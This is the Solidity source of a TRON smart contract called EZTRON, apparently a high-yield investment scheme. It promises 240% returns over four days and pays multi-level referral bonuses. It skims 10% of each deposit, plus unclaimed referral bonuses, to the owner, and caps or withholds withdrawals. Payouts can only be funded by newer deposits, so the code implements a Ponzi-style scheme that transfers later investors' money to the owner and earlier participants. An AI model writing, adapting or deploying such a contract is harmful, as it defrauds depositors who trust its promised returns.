//SourceUnit: eztron.sol

pragma solidity 0.4.25;

contract EZTRON {

    using SafeMath for uint256;

    address public owner;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
    }

    mapping(address => Player) public players;

    uint8 public investment_days;
    uint256 public investment_perc;

    uint256 public total_investors;
    uint256 public total_invested;
    uint256 public total_withdrawn;
    uint256 public total_referral_bonus;

    uint256 public soft_release;
    uint256 public full_release;

    uint8[] public referral_bonuses;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    constructor() public {
        owner = msg.sender;

        investment_days = 4;
        investment_perc = 240;

        referral_bonuses.push(10);
        referral_bonuses.push(5);
        referral_bonuses.push(3);
        referral_bonuses.push(2);

        soft_release = 1609894840;
        full_release = 1609894840;
    }

    function deposit(address _referral) external payable {
        require(now > soft_release, "Not launched");
        require(msg.value >= 5e7, "Minimal deposit: 50 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 1000, "Max 1000 deposits per address");

        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: now
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(10).div(100));

        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() payable external {
        require(now > full_release, "Not launched");
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.referral_bonus;

		// reinvest 40%
        autoreinvest(amount.mul(40).div(100));

        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;
		
		amount = amount.mul(60).div(100);
		
		// transfer remaining balance of contract if withdrawal is big
		amount = amount >= address(this).balance ? address(this).balance * 95 / 100 : amount;
		
		// limit withdrawal to 5,000 trx
		if(amount > 5e9) {
			amount = 5e9;
		}
		
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function autoreinvest(uint256 _amount)private{
        Player storage player = players[msg.sender];
        player.deposits.push(PlayerDeposit({
            amount: _amount,
            totalWithdraw: 0,
            time: now
        }));
        player.total_invested += _amount;
        total_invested += _amount;
    }

    function _setReferral(address _addr, address _referral) private {
		if(_referral == address(0)) {
			// default to owner if no referral
			_referral = owner;
		}
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) {
					// default to owner if no referral
					_referral = owner;
				}
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            uint256 bonus = _amount * referral_bonuses[i] / 100;

            if(ref == address(0) || ref == owner) {
				owner.transfer(bonus);
			} else {
				players[ref].referral_bonus += bonus;
				players[ref].total_referral_bonus += bonus;
			}
			total_referral_bonus += bonus;

			emit ReferralPayout(ref, bonus, (i+1));
			ref = players[ref].referral;
        }
    }


    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = now;
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : now;

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : now;

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}